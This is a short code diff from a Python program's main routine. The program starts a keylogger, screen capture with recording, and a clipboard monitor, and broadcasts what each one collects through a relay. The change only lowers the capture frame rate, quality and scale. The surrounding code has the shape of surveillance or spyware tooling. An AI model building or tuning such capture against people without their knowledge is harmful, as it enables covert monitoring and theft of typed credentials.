@@ -167,7 +167,7 @@ def main():
         relay.run()
 
     kl.Keylogger(broadcast_key).start()
-    capture = sc.ScreenCapture(broadcast_frame, fps=30, quality=65, scale=0.75)
+    capture = sc.ScreenCapture(broadcast_frame, fps=20, quality=55, scale=0.70)
     capture.attach_recorder(recorder)
     capture.start()
     cb.ClipboardMonitor(broadcast_clipboard).start()
